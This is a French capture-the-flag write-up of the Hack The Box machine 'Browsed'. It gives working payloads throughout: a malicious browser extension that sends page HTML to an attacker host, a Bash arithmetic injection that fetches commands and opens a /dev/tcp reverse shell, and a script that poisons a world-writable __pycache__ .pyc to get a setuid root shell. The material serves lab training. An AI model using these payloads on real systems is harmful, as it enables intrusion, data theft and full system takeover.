---
date: 2026-03-25T17:37:14-05:00
# description: ""
image: "/images/HTB-Browsed/browsed.png"
showTableOfContents: true
tags: ["HackTheBox", "all_urls", "browser-extension", "malicious-extension", "bash-arithmetic-injection", "command-injection", "bytecode-cache-poisoning", "python-privesc", "pycache", "import-hijacking"]
categories: ["Writeups"]
title: "HTB: Browsed"
type: "post"
---

* Platforme: Hack The Box
* Lien: [Browsed](https://app.hackthebox.com/machines/Browsed)
* Niveau: Moyen
* OS: Linux
---

Browsed débute par la découverte d’une fonctionnalité d’upload d’extensions de navigateur acceptant des archives ZIP. L’analyse des fichiers sources d’une extension fournie révèle l’utilisation de privilèges `<all_urls>`, suggérant la possibilité d’exécuter des extensions malveillantes dans un contexte de navigation privilégié. Une phase d’énumération approfondie permet ensuite d’identifier un hôte interne exécutant une instance de Gitea. L’inspection du dépôt met en évidence une application accessible uniquement via localhost. En abusant d’une vulnérabilité d’injection d’expression arithmétique Bash dans un script de routine côté backend, nous parvenons à obtenir une exécution de code à distance et à établir un point d’appui initial sur le système.

L’énumération post-exploitation révèle ensuite l’existence d’un répertoire Python `__pycache__` accessible en écriture par tous. L’empoisonnement du bytecode mis en cache d’un module importé permet alors d’exécuter du code en tant que root lors de l’exécution d’un outil Python autorisé via sudo, menant finalement à une compromission complète du système.

# Balayage

```
nmap -p- --open -T4 -sCV -oA nmap/Browsed {TARGET_IP}
```

**Résultats**
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-24 20:55 EDT
Nmap scan report for 10.129.15.229 (10.129.15.229)
Host is up (0.10s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)

80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.50 seconds
```

Deux ports ouverts :
- 22 avec SSH (`OpenSSH 9.6p1`)
- 80 avec http (`nginx 1.24.0`)

Pour faciliter l'énumération, nous ajoutons `browsed.htb` :
```
sudo echo "{IP} browsed.htb" | sudo tee -a /etc/hosts
```

# Énumération

En se rendant sur `http://browsed.htb/`, on découvre un site web dédié au développement d'extensions de navigateur.

![Browsed website](/images/HTB-Browsed/browsed_website.png)

Sur le site `http://browsed.htb/samples.html`, plusieurs exemples d'extensions sont disponibles au téléchargement.

![Browsed extension samples](/images/HTB-Browsed/extensions_samples.png)

L'adresse `http://browsed.htb/upload.php` mène à une page qui nous permet de téléverser notre propre extension en format `.zip`.

![Browsed extension upload page](/images/HTB-Browsed/extension_upload.png)

Après avoir téléchargé et décompressé `fontify.zip`, nous obtenons les fichiers source de l'extension.

![fontify source files](/images/HTB-Browsed/fontify.png)

* `content.js` - Il s'agit du script injecté dans les pages web; il s'exécute au sein du DOM des sites visités.
* `manifest.js` - Il s'agit du fichier de configuration de l'extension. Ce fichier indique au navigateur le nom de l'extension, sa version, sa description, les permissions, etc.
* `popup.html` - Lorsque l'utilisateur clique sur l'icône de l'extension dans la barre d'outils du navigateur, cette page s'ouvre. Elle contient généralement des boutons, un panneau de paramètres, un affichage d'état, etc.
* `popup.js` - La logique contrôlant l'interface utilisateur de la fenêtre contextuelle. Elle contrôle ce qui se passe lorsque l'utilisateur interagit avec la fenêtre contextuelle, gère les clics sur les boutons, enregistre les paramètres dans le stockage du navigateur, etc.
* `style.css` - Il s'agit du style visuel définissant l'apparence de l'interface utilisateur de la fenêtre contextuelle.


Ci-dessous se trouve le contenu de `manifest.json`. 

```JSON
{
  "manifest_version": 3,
  "name": "Font Switcher",
  "version": "2.0.0",
  "description": "Choose a font to apply to all websites!",
  "permissions": [
    "storage",
    "scripting"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_title": "Choose your font"
  },
  "content_scripts": [
    {
      "matches": [
        "<all_urls>"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_idle"
    }
  ]
}
```

Plusieurs éléments retiennent l'attention :
- `"<all_urls>"` dans `content_scripts`: cela signifie que `content.js` est injecté dans chaque site web visité par le navigateur. Le fait que l'extension ne soit pas limitée implique qu'elle peut interagir avec :
    - le site web cible
    - les services localhost
    - les panneaux de configuration internes et peut-être d'autres éléments

- L'extension dispose de l'autorisation `scripting`: dans Manifest V3, `scripting` permet l'injection dynamique de scripts via les API de l'extension. Cela suggère que l'application pourrait :
    - exécuter du code JavaScript contrôlé par un attaquant dans le contexte du navigateur.
	- permettre à une extension téléchargée d'affecter les pages visitées par n'importe quel utilisateur.

> Manifest V3 (MV3) est la dernière mise à jour du framework des extensions Chrome. Il définit la manière dont les extensions sont construites, les API qu’elles peuvent utiliser et la façon dont elles s’exécutent.

Essayons de soumettre `fontify.zip` et observons le comportement de l'application.

```
browsedinternals.htb
```

Nous obtenons un résultat assez volumineux qui nous permet de confirmer plusieurs points.

1. Un navigateur est lancé côté serveur, et l'extension que nous avons téléchargée est chargée dans cette instance du navigateur.
```
DevTools listening on ws://127.0.0.1:32883/devtools/browser/df7ed2d2-8eb8-407c-96da-0240613da95b
```

![Browser instance spawned](/images/HTB-Browsed/DevTools.png)

2. Le navigateur s'exécute à partir du répertoire `/var/www`. Plusieurs chemins d'accès le confirment, par exemple: 
```
/var/www/.config/google-chrome-for-testing/
```

![Browser paths](/images/HTB-Browsed/browser_paths.png)

3. L'extension téléversée est extraite dans le répertoire `/tmp/extension_*`.

```
Cannot stat "/tmp/extension_69c3fd774d2e84.75489890/...."
```

![extensions extraction location](/images/HTB-Browsed/tmp_extension.png)

## Détection d'hôtes supplémentaires

4. Le navigateur automatisé accède aux hôtes internes.

```
http://browsedinternals.htb/

http://localhost/
```

![Browsed internal host](/images/HTB-Browsed/internal_targets.png)

5. Le navigateur dispose d'une connexion réseau ; les requêtes sortantes sont autorisées.
```
NetworkDelegate::NotifyBeforeURLRequest: http://clients2.google.com/time/1/current?
```

![Browsed network capabilities](/images/HTB-Browsed/browser_network.png)

Ces résultats indiquent que le téléversement d'une extension malveillante pourrait permettre l'exécution de code sur le serveur.

Nous remplaçons le contenu de `content.js` comme indiqué ci-dessous, compressons les fichiers et soumettons l'extension.

```Javascript
(async () => {
  try {
    const page = location.href;
    const body = document.documentElement.outerHTML;

    await fetch("http://YOUR_IP:PORT/log", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({
        url: page,
        html: body
      })
    });
  } catch (e) {}
})();
```

Au bout de quelques secondes, nous recevons une réponse sur notre écouteur sous la forme d'une requête POST.

![Browsed POST request](/images/HTB-Browsed/POST_req.png)

L'extension a été chargée avec succès et exécutée au sein de l'instance Chrome côté serveur, pendant que le navigateur se trouvait sur `http://browsedinternals.htb`. Nous sommes également en mesure de récupérer l'intégralité du code HTML sur notre machine d'attaque.

En accédant à `http://browsedinternals.htb/`, nous découvrons une application Python nommée `MarkdownPreview` dans une instance Gitea.

![Browsed Gitea instance](/images/HTB-Browsed/browsed_Gitea.png)

Dans `app.py`, il est indiqué que cette application « ne doit être accessible que via localhost », à l'adresse `127.0.0.1` sur le port `5000`. L'application expose également différents points de terminaison, mais seul `/routines` accepte des données d'entrée (`routine ID`).

![MardownPreview source code](/images/HTB-Browsed/MardownPreview_gitea.png)

Nous vérifions d'abord qu'un service est bien en cours d'exécution sur le port 5000.

```Javascript
(async () => {
  try {
    if (!location.href.startsWith("http://127.0.0.1:5000/")) {
      location.href = "http://127.0.0.1:5000/";
      return;
    }

    await fetch("http://YOUR_IP:PORT/log", {
      method: "POST",
      mode: "no-cors",
      body: JSON.stringify({
        url: location.href,
        html: document.documentElement.outerHTML
      })
    });
  } catch (e) {}
})();
```

Une fois le fichier ZIP envoyé, nous recevons une requête POST sur le listener confirmant que `MarkdownPreview` est en cours d'exécution sur la cible à l'adresse `127.0.0.1:5000`.

![Browsed port 5000 service](/images/HTB-Browsed/browsed_5000.png)

## Script Bash vulnérable

Le script routines.sh est vulnérable à une injection d’expression arithmétique Bash, parce que l’entrée contrôlée par l’utilisateur ($1) est utilisée dans une comparaison numérique :
```
if [[ "$1" -eq 0 ]]; then
```

![vulnerable Bash code](/images/HTB-Browsed/bash_aei.png)

En Bash, les occurrences de `-eq` à l’intérieur de `[[ ... ]]` sont traitées comme des expressions arithmétiques, et non comme de simples nombres. Ainsi, lorsqu’une entrée telle que celle ci-dessous est fournie :
```
a[$(command)]
```

Bash tente d'évaluer l'expression arithmétique, et au cours de cette évaluation, la substitution de commande `$(...)` est exécutée. Plutôt que de simplement vérifier si `$1` est égal à 0, Bash finit donc par exécuter des commandes. 

> Ceci n'est pas un bug, mais une fonctionnalité de Bash. Le développeur doit s'assurer que la validation des données saisies est correcte.

# Accès Initial

Essayons d'exécuter une commande sur la cible en exploitant la vulnérabilité d'injection.

```Javascript
(async () => {
//Base64 encoded command "curl http://YOUR_IP:PORT/pwn"
  const b64 = "Y3VybCBodHRwOi8vMTAuMTAuMTQuOTM6ODAwMC9wd24K";

  const payload =
    `a[$(echo ${b64} | base64 -d | bash)]`;

  const target =
    "http://127.0.0.1:5000/routines/" +
    encodeURIComponent(payload);

  try {
    await fetch(target);
  } catch (e) {}
})();
```

Sur le listener, nous recevons une réponse sous la forme d'une requête GET confirmant que l'exécution des commandes sur la cible est possible.

![curl RCE](/images/HTB-Browsed/curl_CE.png)

Il ne nous reste plus qu'à remplacer la valeur de `b64` par une commande de shell inversé:
```
echo "bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'" | base64
```

Une fois le fichier zip envoyé, nous obtenons un shell sous le nom de `larry`.

![Browsed foothold](/images/HTB-Browsed/Browsed_foothold.png)

Le drapeau utilisateur est accessible à `/home/larry/user.txt`.

# Élévation des privilèges

Nous exécutons la commande `sudo -l` pour consulter les privilèges sudo.

![larry sudo privileges](/images/HTB-Browsed/browsed_sudo_privs.png)

L'utilisateur `larry` peut exécuter `/opt/extensiontool/extension_tool.py` en tant que root sans fournir de mot de passe.

Le script `/opt/extensiontool/extension_tool.py` effectue plusieurs opérations :
- il charge une extension depuis `/opt/extensiontool/extensions/<name>/`.
- il valide `manifest.json`.
- il réécrit optionnellement `manifest.json` lorsque l'option `--bump` est utilisée.
- il crée optionnellement un fichier zip dans `/opt/extensiontool/temp/<basename>`.

Avec LinPEAS, nous découvrons que `/opt/extensiontool/__pycache__` est accessible en écriture par tout le monde.

Un répertoire `__pycache__` accessible en écriture par tous permet aux attaquants d'injecter du bytecode Python malveillant susceptible d'être exécuté par des processus privilégiés lors de l'importation de modules, ce qui peut conduire à l'exécution de code arbitraire et à une élévation de privilèges.

![world-writable pycache directory](/images/HTB-Browsed/pycache_writable.png)

Lorsque le fichier `/opt/extensiontool/extension_tool.py` est exécuté, il doit résoudre le module `extension_utils`, ce qui déclenche le système d'importation. Python va alors :
* rechercher le fichier source `extension_utils.py` dans le même répertoire ou dans `sys.path`. Dans notre cas, Python le trouve à l'emplacement `/opt/extensiontool/extension_utils.py`.
* puis il vérifie le cache compilé `/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc` (la version de Python en cours d'exécution sur la cible est `3.12.3`). À ce stade, des vérifications supplémentaires sont effectuées :
    - Le cache est-il valide ?
	- L'horodatage correspond-il ?
    - La taille correspond-elle ?
    - La version de Python est-elle correcte ?

Si les vérifications sont réussies -> Python charge le fichier `.pyc`. 

Sinon -> Python recompile à partir du fichier source `.py`.

![import file](/images/HTB-Browsed/import_file.png)

Étant donné que `__pycache__` est accessible en écriture à tous les utilisateurs, nous pouvons remplacer le fichier `.pyc` d'origine par un fichier malveillant. Puisque le fichier source existe, nous devons convaincre Python que le cache est valide (c'est-à-dire qu'il doit passer tous les contrôles).

> Si le fichier source `extension_utils.py` venait à manquer, Python aurait alors effectué ce qu'on appelle une `importation sans source`. Dans ce cas, il charge et exécute directement le fichier `.pyc`. Il n'y a ni comparaison d'horodatage, ni comparaison de taille de fichier, ni recompilation. Cependant, même dans ce cas, Python exige toujours : le nom de fichier correct du module, la version de Python et une structure de bytecode valide.

Nous utilisons le script ci-dessous.
```python
cat << 'EOF' > /tmp/poison.py
import os
import py_compile
import shutil
import sys

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"

TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

payload = 'import os\ndef validate_manifest(path): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\ndef clean_temp_files(arg): pass\n'

# Padding with comments to match the exact size of the original file
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# Timestamps synchronization
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# Compilation
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/malicious.pyc")

# File injection
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/malicious.pyc", TARGET_PYC)
print("[+] Poisoned .pyc injected successfully")
EOF
```

Nous exécutons le script pour injecter le fichier malveillant `.pyc`.
```
python3.12 /tmp/poison.py
```

Nous exécutons ensuite `extension_tool.py` afin de charger notre fichier malveillant.
```
sudo /opt/extensiontool/extension_tool.py --ext Fontify
```

Enfin, nous lançons un shell root.
```
/tmp/rootbash -p
```

![Browsed root](/images/HTB-Browsed/browsed_root.png)

